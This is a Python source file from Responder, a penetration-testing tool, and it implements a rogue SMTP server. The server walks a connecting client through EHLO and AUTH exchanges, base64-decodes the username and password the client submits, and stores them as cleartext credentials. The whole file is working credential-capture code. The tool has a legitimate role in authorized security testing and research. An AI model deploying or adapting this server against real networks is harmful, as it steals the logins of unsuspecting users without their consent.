#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import settings

from utils import *
from base64 import b64decode, b64encode
from SocketServer import BaseRequestHandler
from packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2

# ESMTP Server class
class ESMTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(SMTPGreeting()))
			data = self.request.recv(1024)

			if data[0:4] == "EHLO":
				self.request.send(str(SMTPAUTH()))
				data = self.request.recv(1024)

			if data[0:4] == "AUTH":
				self.request.send(str(SMTPAUTH1()))
				data = self.request.recv(1024)
				
				if data:
					try:
						User = filter(None, b64decode(data).split('\x00'))
						Username = User[0]
						Password = User[1]
					except:
						Username = b64decode(data)

						self.request.send(str(SMTPAUTH2()))
						data = self.request.recv(1024)

						if data:
							try: Password = b64decode(data)
							except: Password = data

					SaveToDb({
						'module': 'SMTP', 
						'type': 'Cleartext', 
						'client': self.client_address[0], 
						'user': Username, 
						'cleartext': Password, 
						'fullhash': Username+":"+Password,
					})

		except Exception:
			pass